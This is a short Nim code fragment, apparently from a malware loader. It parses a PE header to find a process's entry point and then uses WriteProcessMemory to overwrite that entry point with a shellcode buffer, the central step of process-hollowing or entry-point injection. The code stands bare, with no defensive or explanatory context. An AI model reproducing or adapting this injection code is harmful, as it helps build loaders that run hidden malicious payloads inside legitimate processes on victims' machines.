var e_lfanew: uint
littleEndian32(addr e_lfanew, addr data[0x3c])
var entrypointRvaOffset = e_lfanew + 0x28
var entrypointRva: uint
littleEndian32(addr entrypointRva, addr data[cast[int](entrypointRvaOffset)])
var entrypointAddress = cast[PVOID](cast[uint64](imageBaseAddress) + entrypointRva)
WriteProcessMemory(pHandle, entrypointAddress, unsafeAddr shellcode, len(shellcode), addr bytesWritten)
